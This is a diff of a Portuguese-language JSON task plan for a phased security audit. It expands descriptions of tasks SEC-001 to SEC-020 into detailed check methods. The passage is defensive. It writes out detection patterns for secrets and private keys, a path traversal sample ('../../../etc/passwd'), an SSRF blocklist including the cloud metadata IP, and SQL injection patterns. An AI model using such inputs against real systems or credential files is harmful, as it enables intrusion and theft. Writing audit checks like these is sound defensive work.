@@ -22,7 +22,7 @@
       "task_id": "SEC-001",
       "task_kind": "spec",
       "title": "Identificar stack tecnológica",
-      "description": "Mapear linguagens, frameworks, bancos de dados, serviços cloud e dependências externas do sistema auditado.",
+      "description": "Mapear completamente a stack tecnológica do sistema auditado para que todas as tasks subsequentes possam referenciar linguagens, frameworks e serviços com precisão. MÉTODO: (1) Inspecionar arquivos de manifesto de dependências nos targets listados. (2) Para Node.js: ler package.json — extrair 'dependencies' e 'devDependencies', identificar framework (express/fastify/nestjs/next/nuxt), ORM (prisma/sequelize/typeorm/drizzle), e runtime (node versão). (3) Para Python: ler requirements.txt ou Pipfile — identificar framework (django/fastapi/flask), ORM (sqlalchemy/django-orm), e versão do Python. (4) Para Go: ler go.mod — identificar framework (gin/echo/fiber/chi). (5) Para PHP: ler composer.json — identificar framework (laravel/symfony/slim). (6) Inspecionar Dockerfile e docker-compose.yml para identificar: banco de dados (postgres/mysql/mongodb/redis), mensageria (rabbitmq/kafka/sqs), serviços de storage (s3/azure-blob/gcs), e versões de imagens base. (7) Identificar serviços de terceiros referenciados: pagamentos (stripe/mercadopago), auth (auth0/firebase-auth/cognito), email (sendgrid/ses/mailgun), observabilidade (datadog/sentry/newrelic). (8) Verificar se há BaaS: Supabase, Firebase, PocketBase, Appwrite. OUTPUT FORMAT: Produzir 'reports/phase1/tech-stack-inventory.md' com seções: ## Runtime & Linguagem (versões), ## Frameworks (web + ORM + validação + auth), ## Banco de Dados (tipo + versão + ORM), ## Infraestrutura (cloud + containers + orquestração), ## Serviços de Terceiros (nome + categoria + relevância para segurança), ## BaaS (se aplicável, com notas sobre RLS/Rules). DONE WHEN: Arquivo gerado com todas as seções preenchidas e nenhuma tecnologia identificada nos targets ficou sem categoria.",
       "status": "todo",
       "depends_on": [],
       "targets": [
@@ -49,9 +49,11 @@
       "task_id": "SEC-002",
       "task_kind": "spec",
       "title": "Identificar arquitetura do sistema",
-      "description": "Documentar componentes, fluxos de dados, pontos de integração e fronteiras de confiança.",
+      "description": "Documentar a arquitetura do sistema identificando componentes, fluxos de dados entre eles, pontos de integração com serviços externos e fronteiras de confiança (trust boundaries), usando como base o inventário produzido em SEC-001. MÉTODO: (1) Ler docker-compose.yml para identificar serviços, suas redes, portas expostas e variáveis de ambiente — cada 'service' é um componente; cada 'networks' é um segmento de rede. (2) Se Kubernetes: ler manifestos em k8s/ — identificar Deployments, Services, Ingress, NetworkPolicies e namespaces. (3) Se Terraform: ler terraform/ — identificar recursos cloud (VPCs, subnets, security groups, load balancers, RDS, S3). (4) Se existir docs/architecture.md: ler e extrair informações estruturais. (5) Mapear fluxo de dados para operações típicas: request do usuário → load balancer → API → banco → resposta. (6) Identificar trust boundaries: onde dados passam de zona não-confiável para confiável (internet → DMZ, DMZ → backend, backend → DB). (7) Identificar onde secrets circulam: quais componentes leem variáveis de ambiente sensíveis. OUTPUT FORMAT: Produzir dois arquivos: (A) 'reports/phase1/architecture-map.md' com seções: ## Componentes (nome, tipo, função, portas), ## Topologia de Rede (segmentos, exposição pública vs privado), ## Trust Boundaries (lista com descrição), ## Fluxo de Autenticação (como credenciais circulam), ## Integrações Externas (endpoint, protocolo, dados trafegados). (B) 'reports/phase1/data-flow-diagram.md' com diagrama textual ASCII ou Mermaid do fluxo principal de dados. DONE WHEN: Os dois arquivos gerados; trust boundaries identificados; topologia de rede documentada.",
       "status": "todo",
-      "depends_on": ["SEC-001"],
+      "depends_on": [
+        "SEC-001"
+      ],
       "targets": [
         "docker-compose.yml",
         "k8s/",
@@ -72,9 +74,11 @@
       "task_id": "SEC-003",
       "task_kind": "spec",
       "title": "Identificar superfícies de ataque",
-      "description": "Enumerar todos os pontos de entrada: endpoints, interfaces, uploads, websockets, APIs externas.",
+      "description": "Enumerar exaustivamente todas as superfícies de ataque do sistema — cada ponto onde input externo pode entrar na aplicação — para que as tasks de auditoria (SEC-010 a SEC-025) saibam exatamente o que cobrir. Depende de SEC-002 para ter o mapa de arquitetura. MÉTODO: (1) HTTP Endpoints: varrer src/routes/, src/controllers/, src/handlers/ e buscar definições de rota — registrar método HTTP (GET/POST/PUT/PATCH/DELETE), path, e se há middleware de autenticação aplicado. Buscar por padrões: app.get|post|put|patch|delete|use, router.get|post|put..., @Get|@Post|@Put... (NestJS/Spring). (2) Se existir openapi.yaml ou swagger.json: parsear e extrair todos os paths e métodos como fonte canônica. (3) Upload endpoints: grep -rn -iE '(multer|upload|multipart|form-data|FileUpload)' — listar cada endpoint que aceita arquivos. (4) WebSockets: grep -rn -iE '(socket.io|ws:|websocket|on\\x28.message|wss:)' — listar eventos e handlers. (5) Background jobs / workers: grep -rn -iE '(cron|job|queue|worker|schedule|bull|celery|sidekiq)' — listar tasks agendadas e se aceitam input externo. (6) Webhooks recebidos: grep -rn -iE '(webhook|stripe.*event|github.*event|payload.*signature)' — listar endpoints receptores. (7) CLI / admin interfaces: buscar por scripts em scripts/, bin/, cli/ que aceitam argumentos externos. (8) Para cada superfície: classificar como 'autenticado', 'público', 'admin-only', 'interno'. OUTPUT FORMAT: Produzir 'reports/phase1/attack-surface-inventory.md' com tabela: | Superfície | Tipo | Path/Evento | Auth Required | Aceita Arquivo | Observações |. Ao final: contagem total por tipo. Esta tabela é a referência primária para todas as tasks de auditoria. DONE WHEN: Arquivo gerado; todas as rotas identificadas nos targets mapeadas; endpoints classificados por nível de acesso.",
       "status": "todo",
-      "depends_on": ["SEC-002"],
+      "depends_on": [
+        "SEC-002"
+      ],
       "targets": [
         "src/routes/",
         "src/controllers/",
@@ -95,9 +99,11 @@
       "task_id": "SEC-010",
       "task_kind": "impl",
       "title": "Auditar Secrets & Configuração",
-      "description": "Verificar exposição de segredos hardcoded, chaves API no frontend, .env commitados, CORS permissivo, debug mode, credenciais padrão, configs de exemplo e variáveis sensíveis em logs. Playbook: secrets_config (SC-001 a SC-008).",
+      "description": "Executar auditoria completa de secrets e configuração do sistema, cobrindo os 9 checks do playbook secrets_config (SC-001 a SC-009). Esta é a task de maior prioridade — segredos expostos são o vetor de comprometimento mais frequente e mais rápido de explorar. CHECKS A EXECUTAR: (SC-001) Segredos hardcoded: grep -rn em todo código-fonte por patterns de password=, api_key=, secret=, tokens AWS (AKIA...), chaves privadas (BEGIN RSA PRIVATE KEY), excluindo node_modules, .git, dist, e arquivos de teste. (SC-002) Chaves no frontend: identificar diretórios client-side (src/components, pages, public) e buscar por variáveis NEXT_PUBLIC_, VITE_, REACT_APP_ que contenham 'secret', 'private', 'key' — distinguir de publishable keys legítimas (sk_ vs pk_). (SC-003) .env commitado: verificar se .env, .env.local, .env.production existem no repo via git ls-files; verificar se .gitignore contém padrão .env*; verificar histórico git com git log --all -- '*.env'. (SC-004) CORS permissivo: buscar por origin: '*', AllowAllOrigins, cors({ origin: true }) e verificar se credentials:true está combinado com wildcard — isso é vulnerabilidade real. (SC-005) Debug mode em produção: buscar DEBUG=true, FLASK_DEBUG=1, NODE_ENV=development em configs de produção; buscar por stack traces em handlers de erro. (SC-006) Credenciais padrão: buscar admin:admin, root:root, password=123456 em docker-compose e seeds/fixtures. (SC-007) Configs de exemplo em produção: verificar se Dockerfile copia *.example diretamente. (SC-008) Variáveis sensíveis em logs: buscar console.log/logger.*password/token/secret em código de produção. (SC-009) BaaS sem RLS: detectar uso de Supabase/Firebase; verificar migrations por ENABLE ROW LEVEL SECURITY; se endpoint_base_url disponível, executar curl com anon key. OUTPUT FORMAT: Gerar dois arquivos: (A) 'reports/phase2/secrets-config-audit.md' — narrativa com evidências por check. (B) 'reports/phase2/results/SEC-010.json' — array de objetos {check_id, check_name, status, severity_if_fail, evidence, remediation} para cada um dos 9 checks, com status: pass|fail|partial|not_applicable|error. DONE WHEN: Os 9 checks executados; ambos os arquivos gerados; nenhum check com status 'error' sem justificativa.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "**/*.{js,ts,py,go,java,php,rb,cs,rs}",
         "**/*.{json,yaml,yml,toml,xml,ini,cfg}",
@@ -119,9 +125,11 @@
       "task_id": "SEC-011",
       "task_kind": "impl",
       "title": "Auditar Dependências e Supply Chain",
-      "description": "Analisar dependências com CVEs conhecidos, pacotes abandonados, typosquatting, lockfile, builds não reproduzíveis. Playbook: dependencies_supply_chain (DS-001 a DS-006).",
+      "description": "Executar auditoria de dependências e supply chain cobrindo os 6 checks do playbook dependencies_supply_chain (DS-001 a DS-006). O objetivo é identificar dependências com CVEs conhecidos, pacotes abandonados ou suspeitos (typosquatting), e garantir builds reproduzíveis. CHECKS A EXECUTAR: (DS-001) CVEs conhecidos: executar 'npm audit --json' (Node.js), 'pip-audit -r requirements.txt --format json' (Python), 'govulncheck ./...' (Go), conforme stack identificada em SEC-001. Classificar findings por severidade. Se ferramentas não disponíveis: verificar versões no lockfile contra CVE databases conhecidas (NVD, OSV). (DS-002) Pacotes abandonados: verificar data de último publish e número de downloads semanais para dependências diretas — red flags: sem atualização há mais de 2 anos + zero downloads recentes + issue tracker fechado. (DS-003) Typosquatting: comparar nomes das dependências contra lista de pacotes populares conhecidos, buscando variações de 1-2 caracteres (ex: 'lodahs' vs 'lodash', 'requets' vs 'requests'). Verificar pacotes com escopo/@org suspeitos imitando pacotes oficiais. (DS-004) Lockfile ausente: verificar presença de package-lock.json, yarn.lock, Pipfile.lock, go.sum, Cargo.lock; verificar se lockfile está no .gitignore (não deveria estar para aplicações). (DS-005) Postinstall scripts não auditados: grep em node_modules/*/package.json por postinstall e preinstall — listar os primeiros 20 e avaliar quais são de pacotes desconhecidos ou com poucos downloads. (DS-006) Build não reproduzível: verificar se Dockerfile usa tags :latest; verificar se CI usa npm ci ao invés de npm install; verificar se versões de dependências de sistema estão pinadas. OUTPUT FORMAT: (A) 'reports/phase2/dependencies-audit.md' — narrativa com lista de vulnerabilidades encontradas, pacotes suspeitos. (B) 'reports/phase2/results/SEC-011.json' — array {check_id, status, severity_if_fail, evidence, remediation} para DS-001 a DS-006. DONE WHEN: Ferramenta de auditoria executada (ou ausência justificada); 6 checks com status registrado.",
       "status": "todo",
-      "depends_on": ["SEC-001"],
+      "depends_on": [
+        "SEC-001"
+      ],
       "targets": [
         "package.json",
         "package-lock.json",
@@ -146,9 +154,11 @@
       "task_id": "SEC-012",
       "task_kind": "impl",
       "title": "Auditar Autenticação",
-      "description": "Avaliar hash de senhas, MFA, reset de senha, expiração de sessão, brute force, tokens permanentes e session fixation. Playbook: authentication (AU-001 a AU-008).",
+      "description": "Executar auditoria do sistema de autenticação cobrindo os 8 checks do playbook authentication (AU-001 a AU-008). O objetivo é garantir que credenciais são armazenadas e verificadas com segurança, e que o sistema resiste a ataques de força bruta, session hijacking e comprometimento de credenciais. CHECKS A EXECUTAR: (AU-001) Senhas em texto plano: identificar models/schemas de usuário e verificar se o campo password passa por hash (bcrypt/argon2/scrypt/pbkdf2) antes de ser persistido — buscar por save() ou insert() com password sem hash intermediário. (AU-002) Hash inseguro: verificar se MD5, SHA1 ou SHA256 sem salt são usados para senhas — esses são algoritmos de checksum, não de KDF. bcrypt deve ter cost >= 12; argon2 memory >= 64MB e iterations >= 3. (AU-003) Ausência de MFA: buscar por totp, speakeasy, pyotp, google-authenticator, authenticator-app — ausência não é FAIL automático mas deve ser documentado como risco para sistemas com dados sensíveis. (AU-004) Reset de senha inseguro: verificar se tokens de reset expiram (max 1h), têm entropia suficiente (>= 32 bytes aleatórios), e são invalidados após uso — buscar por crypto.randomBytes, secrets.token_urlsafe, token_length. (AU-005) Tokens permanentes: verificar se JWTs têm campo 'exp'; verificar se API keys têm política de expiração; buscar por expiresIn, token_expiry, jwt_ttl. (AU-006) Sem proteção a brute force: verificar se há rate limiting ou account lockout no endpoint de login — buscar por failedAttempts, loginAttempts, lockUntil, rateLimit no contexto de auth. (AU-007) Session fixation: verificar se após login bem-sucedido a sessão é regenerada — buscar por req.session.regenerate, session.invalidate, SessionFixation. (AU-008) Logout incompleto: verificar se logout destrói a sessão no servidor (não apenas no client) — buscar por session.destroy, session.invalidate, token blacklist, refresh_token revocation. OUTPUT FORMAT: (A) 'reports/phase2/authentication-audit.md'. (B) 'reports/phase2/results/SEC-012.json' — {check_id, status, severity_if_fail, evidence, remediation} para AU-001 a AU-008. DONE WHEN: 8 checks executados; output JSON gerado; evidências de código referenciadas com path e linha.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/models/user*",
         "src/auth/",
@@ -170,9 +180,11 @@
       "task_id": "SEC-013",
       "task_kind": "impl",
       "title": "Auditar Autorização",
-      "description": "Verificar controle de acesso, IDOR, permissões só no frontend, admin routes, escopo de permissões e ações sem confirmação. Playbook: authorization (AZ-001 a AZ-006).",
+      "description": "Executar auditoria do sistema de autorização cobrindo os 6 checks do playbook authorization (AZ-001 a AZ-006). Depende de SEC-012 porque autorização pressupõe autenticação funcionando. O objetivo é garantir que usuários só acessam recursos que lhes pertencem e que a lógica de controle de acesso está no backend, nunca apenas no frontend. CHECKS A EXECUTAR: (AZ-001) Middleware de auth ausente em rotas: usar o inventário de SEC-003 (attack-surface-inventory.md) e verificar se CADA rota autenticada tem middleware de auth aplicado — buscar por requireAuth, authenticate, @UseGuards, @Protected, isAuthenticated em cada handler do inventário. Rotas sem middleware em paths que deveriam ser protegidos são FAIL crítico. (AZ-002) IDOR — Insecure Direct Object Reference: buscar endpoints que aceitam IDs de recursos (userId, documentId, orderId) e verificar se a query filtra por user_id da sessão — padrão SEGURO: 'WHERE id = ? AND user_id = req.user.id'; padrão INSEGURO: 'WHERE id = req.params.id' sem filtro de owner. Verificar todos os endpoints GET/PUT/PATCH/DELETE que recebem IDs nos targets. (AZ-003) Autorização apenas no frontend: buscar por condicionais de renderização baseadas em role no frontend (v-if role, {isAdmin && <Component>}) e verificar se o endpoint correspondente TAMBÉM valida role no backend. (AZ-004) Admin routes sem guard: listar todas as rotas com prefixo /admin, /backoffice, /internal e verificar se cada uma tem verificação de role admin no backend — não apenas middleware de autenticação genérico. (AZ-005) Permissões sem granularidade: verificar se o sistema tem apenas 2 roles (admin/user) sem permissões granulares — documentar como risco para sistemas complexos; listar as permissões existentes. (AZ-006) Ações sensíveis sem confirmação: listar endpoints de DELETE, disable, revoke, ban e verificar se exigem step de confirmação (re-auth, confirmation token) para ações irreversíveis. OUTPUT FORMAT: (A) 'reports/phase2/authorization-audit.md' com foco especial em lista de IDORs encontrados. (B) 'reports/phase2/results/SEC-013.json' — {check_id, status, severity_if_fail, evidence, remediation} para AZ-001 a AZ-006. DONE WHEN: Inventário de SEC-003 percorrido para AZ-001 e AZ-002; 6 checks com status registrado.",
       "status": "todo",
-      "depends_on": ["SEC-012"],
+      "depends_on": [
+        "SEC-012"
+      ],
       "targets": [
         "src/middleware/",
         "src/policies/",
@@ -194,9 +206,11 @@
       "task_id": "SEC-014",
       "task_kind": "impl",
       "title": "Auditar Segurança de API",
-      "description": "Avaliar rate limiting, over-fetching, enumeração de usuários, validação de schema, versionamento, paginação e replay attacks. Playbook: api_security (AP-001 a AP-007).",
+      "description": "Executar auditoria da camada de API cobrindo os 8 checks do playbook api_security (AP-001 a AP-008). O objetivo é garantir que a API resiste a abuso de volume, não vaza dados excessivos, não permite enumeração de usuários, e trata corretamente idempotência em operações críticas. CHECKS A EXECUTAR: (AP-001) Sem rate limiting: buscar por express-rate-limit, django-ratelimit, go-rate, limiter, throttle — verificar se rate limit está em endpoints sensíveis (login, register, reset, webhook) e se há proteção na infra (nginx limit_req, API gateway). Se endpoint_base_url disponível: enviar 20 requests em sequência ao endpoint de login e verificar se aparece 429. (AP-002) Over-fetching de dados: identificar endpoints que retornam objetos inteiros — buscar por findAll sem select, res.json(user) sem DTO, serialize sem exclusão de campos; verificar se password_hash, internal_token, CPF aparecem nas responses. (AP-003) Enumeração de usuários: verificar se respostas de login/register/reset distinguem 'usuário não existe' de 'senha incorreta' — mensagens diferentes permitem enumerar emails válidos. (AP-004) Sem validação de schema: verificar se endpoints POST/PUT/PATCH validam body antes de processar — buscar por joi, zod, yup, pydantic, marshmallow, class-validator; red flag: req.body.field sem validação prévia. (AP-005) API sem versionamento: verificar se há /api/v1/ ou header Accept-Version — ausência é LOW mas deve ser documentado. (AP-006) Listagens sem paginação: buscar endpoints findAll/list sem limit/offset/cursor — sem max_limit, um request pode retornar toda a tabela. (AP-007) Replay attacks: verificar se operações financeiras/destrutivas têm idempotency key, nonce ou timestamp validation. (AP-008) Webhook sem idempotência: identificar endpoint de webhook de pagamento (Stripe, etc.); verificar se event_id é persistido com unique constraint antes de processar — sem isso, retry do provider processa pagamento duas vezes. OUTPUT FORMAT: (A) 'reports/phase2/api-security-audit.md'. (B) 'reports/phase2/results/SEC-014.json' — {check_id, status, severity_if_fail, evidence, remediation} para AP-001 a AP-008. DONE WHEN: 8 checks executados; endpoints de listagem e webhooks explicitamente verificados.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/routes/",
         "src/controllers/",
@@ -218,9 +232,11 @@
       "task_id": "SEC-015",
       "task_kind": "impl",
       "title": "Auditar Validação de Entrada",
-      "description": "Testar SQL injection, command injection, template injection, SSRF, XSS, inputs não validados e sanitização ausente. Playbook: input_validation (IV-001 a IV-007).",
+      "description": "Executar auditoria de validação de entrada cobrindo os 7 checks do playbook input_validation (IV-001 a IV-007). Esta task cobre as categorias OWASP A01, A03 e A10. O objetivo é garantir que nenhum input externo chegue ao banco de dados, sistema de arquivos, templates ou comandos do SO sem sanitização adequada. CHECKS A EXECUTAR: (IV-001) SQL injection: buscar concatenação de strings em SQL — grep por f-string ou template literal com SELECT/INSERT/UPDATE/DELETE; verificar raw queries em ORMs (.raw(), execute_sql, db.execute) e confirmar que usam parametrização ($1, ?, :param); buscar por string interpolation como `SELECT * FROM users WHERE id = ${req.params.id}`. (IV-002) Command injection: buscar exec, spawn, system, popen, subprocess, child_process, shell_exec — verificar se input do usuário é passado como argumento; verificar se usa shell=True (Python) ou execFile vs exec (Node.js). (IV-003) Template injection: identificar engine de templates (Jinja2, Nunjucks, Handlebars, EJS); verificar se render_template_string, nunjucks.renderString, Template() recebem input do usuário como string de template; verificar se autoescaping está habilitado. (IV-004) SSRF: buscar por fetch, axios, requests.get, urllib, HttpClient que recebem URL de input do usuário — funcionalidades de webhook, preview de link, import de URL, proxy de imagem; verificar se há blocklist de IPs privados (127.0.0.1, 10.x, 172.16-31.x, 169.254.169.254). (IV-005) XSS: verificar se framework tem auto-escaping (React JSX é seguro por padrão); buscar bypasses: dangerouslySetInnerHTML, v-html, [innerHTML], |safe — para cada uso verificar se dado sanitizado com DOMPurify; buscar DOM manipulation: innerHTML, outerHTML, document.write com dados externos. (IV-006) Inputs sem validação: verificar se todos os endpoints POST/PUT/PATCH validam tipo, formato e limites; buscar req.body.field acessado diretamente sem schema validation. (IV-007) Sanitização ausente: verificar se há sanitização contextual — HTML encode para render, parameterize para SQL, shellescape para comandos; dados sanitizados na entrada E na saída. OUTPUT FORMAT: (A) 'reports/phase2/input-validation-audit.md'. (B) 'reports/phase2/results/SEC-015.json' — {check_id, status, severity_if_fail, evidence, remediation} para IV-001 a IV-007. DONE WHEN: 7 checks executados; cada raw query e cada shell exec explicitamente avaliados.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/controllers/",
         "src/handlers/",
@@ -243,9 +259,11 @@
       "task_id": "SEC-016",
       "task_kind": "impl",
       "title": "Auditar Upload de Arquivos",
-      "description": "Verificar validação de tipo, limite de tamanho, storage seguro, antivírus, uploads executáveis e filenames não sanitizados. Playbook: file_upload (FU-001 a FU-006).",
+      "description": "Executar auditoria do sistema de upload de arquivos cobrindo os 6 checks do playbook file_upload (FU-001 a FU-006). O objetivo é garantir que uploads não permitam execução de código no servidor, não causem DoS por tamanho ilimitado, e que arquivos sejam armazenados e servidos de forma segura. Executar apenas se o inventário de SEC-003 identificar endpoints de upload; caso contrário: gerar resultado not_applicable para todos os checks. CHECKS A EXECUTAR: (FU-001) Sem validação de tipo: identificar endpoints de upload (multer, formidable, busboy, UploadedFile); verificar se há whitelist de MIME types e extensões — blacklist é insuficiente; verificar se magic bytes são checados (file-type, python-magic, libmagic) e não apenas extensão do filename. (FU-002) Sem limite de tamanho: buscar maxFileSize, MAX_CONTENT_LENGTH, client_max_body_size, limits.fileSize; verificar se limite está no backend e no web server — limite apenas no HTML input não é segurança. (FU-003) Storage no servidor da aplicação: verificar destino dos uploads — UPLOAD_DIR no filesystem local do app é risco de path traversal e RCE; verificar uso de S3/Azure Blob/GCS; verificar se há express.static apontando para diretório de uploads. (FU-004) Sem antivírus: buscar por clamav, clamscan, virusTotal, malware scan no pipeline de upload; ausência é risco MEDIUM para sistemas que permitem download posterior dos arquivos. (FU-005) Upload executável possível: verificar se extensões .php, .jsp, .py, .sh, .exe, .bat, .cmd são bloqueadas; verificar se web server interpreta arquivos no diretório de uploads (nginx sem php no location de uploads); verificar se Content-Disposition: attachment é forçado em downloads. (FU-006) Filenames não sanitizados: verificar se filename original do usuário é usado no filesystem — path traversal via '../../../etc/passwd'; verificar se filename é substituído por UUID + extensão validada. OUTPUT FORMAT: (A) 'reports/phase2/file-upload-audit.md'. (B) 'reports/phase2/results/SEC-016.json' — {check_id, status, severity_if_fail, evidence, remediation} para FU-001 a FU-006. DONE WHEN: 6 checks com status; se não há upload: arquivo gerado com todos not_applicable justificados.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/controllers/upload*",
         "src/middleware/upload*",
@@ -266,9 +284,11 @@
       "task_id": "SEC-017",
       "task_kind": "impl",
       "title": "Auditar Segurança de Sessão",
-      "description": "Avaliar cookies httpOnly/Secure/SameSite, CSRF tokens, expiração de sessão e tokens reutilizáveis. Playbook: session_security (SS-001 a SS-006).",
+      "description": "Executar auditoria de segurança de sessão cobrindo os 6 checks do playbook session_security (SS-001 a SS-006). Depende de SEC-012 pois complementa a auditoria de autenticação com foco no ciclo de vida das sessões. O objetivo é garantir que cookies são configurados com flags de segurança, CSRF está mitigado, sessões expiram e tokens de uso único são invalidados. CHECKS A EXECUTAR: (SS-001) Cookies sem httpOnly: buscar configuração de cookies de sessão e auth — httpOnly: true deve estar presente; se endpoint_base_url disponível: curl -sI e verificar Set-Cookie headers por ausência de httponly flag. (SS-002) Cookies sem Secure: verificar Secure flag em cookies sensíveis — sem ela, cookie é transmitido em HTTP. (SS-003) SameSite ausente: verificar atributo SameSite em cookies de sessão — deve ser Lax ou Strict; None requer também Secure e é necessário apenas para casos específicos de cross-origin legítimo. (SS-004) CSRF sem proteção: verificar se endpoints state-changing (POST/PUT/PATCH/DELETE) validam CSRF token — buscar por csrf_token, X-CSRF-Token, csrf middleware; alternativa: verificar se SameSite=Strict/Lax está configurado o que mitiga CSRF sem token explícito. (SS-005) Sessão sem expiração: verificar session.maxAge, SESSION_LIFETIME, jwt expiresIn — sessões permanentes são risco de comprometimento prolongado; verificar se store limpa sessões expiradas. (SS-006) Tokens reutilizáveis: verificar se tokens de ação única (reset de senha, confirm email, invite) são invalidados após primeiro uso — buscar por used=true, token=null, delete token após consumo; verificar se refresh tokens são rotacionados a cada uso. OUTPUT FORMAT: (A) 'reports/phase2/session-security-audit.md'. (B) 'reports/phase2/results/SEC-017.json' — {check_id, status, severity_if_fail, evidence, remediation} para SS-001 a SS-006. DONE WHEN: 6 checks executados; headers de Set-Cookie verificados estática e/ou dinamicamente.",
       "status": "todo",
-      "depends_on": ["SEC-012"],
+      "depends_on": [
+        "SEC-012"
+      ],
       "targets": [
         "src/config/session*",
         "src/middleware/csrf*",
@@ -289,9 +309,11 @@
       "task_id": "SEC-018",
       "task_kind": "impl",
       "title": "Auditar Criptografia",
-      "description": "Verificar HTTPS obrigatório, algoritmos criptográficos, encryption at-rest, chaves expostas e rotação de chaves. Playbook: cryptography (CR-001 a CR-005).",
+      "description": "Executar auditoria de criptografia cobrindo os 5 checks do playbook cryptography (CR-001 a CR-005). O objetivo é garantir que a comunicação é sempre criptografada, que algoritmos modernos são usados, que dados sensíveis estão criptografados em repouso, e que chaves são gerenciadas com segurança. CHECKS A EXECUTAR: (CR-001) HTTPS não obrigatório: verificar configuração de redirect HTTP→HTTPS no nginx.conf, load balancer, ou middleware da aplicação; verificar HSTS header (Strict-Transport-Security); se endpoint_base_url disponível: curl -sI http://dominio (sem S) e verificar redirect 301. (CR-002) Algoritmos inseguros: buscar MD5, SHA1, DES, RC4, ECB, Blowfish em contextos de segurança — MD5 para checksum de arquivo é aceitável, MD5 para senha não; verificar versão TLS (TLSv1.0 e TLSv1.1 são deprecated); buscar Math.random, rand() usado para tokens/secrets (deve ser crypto.randomBytes). (CR-003) Dados sensíveis sem criptografia at-rest: identificar campos PII/sensíveis nos schemas (CPF, CNPJ, cartão, dados de saúde, endereço) e verificar se há encrypt/cipher/AES aplicado ou se banco tem encryption at-rest habilitado (RDS encryption, transparent data encryption). (CR-004) Chaves criptográficas expostas: verificar se JWT_SECRET, SIGNING_KEY, AES_KEY estão em variáveis de ambiente ou secrets manager — não em código; verificar permissões de arquivos .pem e .key (devem ser 600). (CR-005) Sem rotação de chaves: verificar se há mecanismo de key rotation — JWKS endpoint com kid header para JWT; KMS auto-rotation; documentação de política de rotação. OUTPUT FORMAT: (A) 'reports/phase2/cryptography-audit.md'. (B) 'reports/phase2/results/SEC-018.json' — {check_id, status, severity_if_fail, evidence, remediation} para CR-001 a CR-005. DONE WHEN: 5 checks executados; cada algoritmo criptográfico identificado avaliado por contexto de uso.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/config/",
         "src/utils/crypto*",
@@ -313,9 +335,11 @@
       "task_id": "SEC-019",
       "task_kind": "impl",
       "title": "Auditar Headers de Segurança",
-      "description": "Verificar CSP, HSTS, X-Frame-Options, X-Content-Type-Options e Referrer-Policy. Playbook: security_headers (SH-001 a SH-005).",
+      "description": "Executar auditoria de headers de segurança HTTP cobrindo os 5 checks do playbook security_headers (SH-001 a SH-005). O objetivo é garantir que a aplicação usa os headers de segurança recomendados pelo OWASP para prevenir XSS, clickjacking, MIME sniffing e transmissão não-segura. CHECKS A EXECUTAR: (SH-001) Content-Security-Policy ausente: verificar se CSP está configurado — buscar por 'Content-Security-Policy', helmet.contentSecurityPolicy, csp middleware; avaliar se CSP é restritivo (sem 'unsafe-inline', sem 'unsafe-eval', sem wildcard *) ou meramente presente como placeholder. (SH-002) HSTS ausente: verificar Strict-Transport-Security com max-age >= 31536000 (1 ano) e preferencialmente includeSubDomains; ausência é HIGH para aplicações HTTPS. (SH-003) X-Frame-Options ausente: verificar header X-Frame-Options: DENY ou SAMEORIGIN para prevenir clickjacking; alternativa moderna: CSP frame-ancestors. (SH-004) X-Content-Type-Options ausente: verificar X-Content-Type-Options: nosniff para prevenir MIME type sniffing. (SH-005) Referrer-Policy ausente: verificar Referrer-Policy para controlar quais dados de URL são enviados em requisições cross-origin — deve ser no-referrer ou strict-origin-when-cross-origin. MÉTODO ESTÁTICO: buscar middleware de headers — helmet (Node.js), SecurityMiddleware (Django), SecurityHeaders (Laravel), nginx add_header; verificar configuração de cada header. MÉTODO DINÂMICO (se endpoint_base_url disponível): curl -sI ${endpoint_base_url} | grep -i 'content-security-policy\\|strict-transport\\|x-frame-options\\|x-content-type\\|referrer-policy'. OUTPUT FORMAT: (A) 'reports/phase2/security-headers-audit.md'. (B) 'reports/phase2/results/SEC-019.json' — {check_id, status, severity_if_fail, evidence, remediation} para SH-001 a SH-005. DONE WHEN: 5 checks executados; para cada header: presente/ausente/presente-mas-misconfigured documentado.",
       "status": "todo",
-      "depends_on": ["SEC-003"],
+      "depends_on": [
+        "SEC-003"
+      ],
       "targets": [
         "src/middleware/helmet*",
         "src/middleware/headers*",
@@ -336,9 +360,11 @@
       "task_id": "SEC-020",
       "task_kind": "impl",
       "title": "Auditar Logs e Monitoramento",
-      "description": "Avaliar dados sensíveis em logs, audit trail, logs estruturados, alertas de segurança e correlation IDs. Playbook: logging_monitoring (LM-001 a LM-005).",
+      "description": "Executar auditoria de logs e monitoramento cobrindo os 6 checks do playbook logging_monitoring (LM-001 a LM-006). O objetivo é garantir que logs não vazam dados sensíveis, que ações críticas são auditáveis, que logs têm estrutura para análise automatizada, e que erros HTTP retornam mensagens genéricas ao client. CHECKS A EXECUTAR: (LM-001) Logs com dados sensíveis: buscar console.log/logger.*password|token|secret|authorization em código de produção; verificar se request/response logging inclui headers de auth ou body com PII; verificar se há middleware de redação (redact, mask, sanitize) configurado no logger. (LM-002) Sem audit trail: verificar se ações críticas são logadas com who/what/when/where/result — login, logout, create/delete user, change permissions, acesso a dados sensíveis; buscar por audit_log, security_log, event sourcing de ações administrativas. (LM-003) Logs não estruturados: verificar se é usado logger estruturado (winston JSON, pino, structlog, logrus, zap) ou console.log de strings — logs estruturados (JSONL) são essenciais para SIEM e alertas automáticos. (LM-004) Sem alertas de segurança: verificar se há configuração de alertas para múltiplas falhas de login, rate limit exceeded, error rate spikes — buscar por Sentry, Datadog, PagerDuty, webhook de alerta. (LM-005) Sem correlation ID: verificar se há middleware que injeta X-Request-ID ou correlation_id em cada request e o propaga em logs e chamadas downstream — essencial para debugar incidentes em produção. (LM-006) Respostas HTTP de erro expondo internals: verificar error handlers globais — buscar por err.stack, err.message, exception.message retornados na response HTTP; verificar se NODE_ENV diferencia detalhes de erro entre dev e prod; se endpoint_base_url disponível: enviar JSON malformado e ID inexistente e inspecionar response por stack traces, query SQL, caminhos de 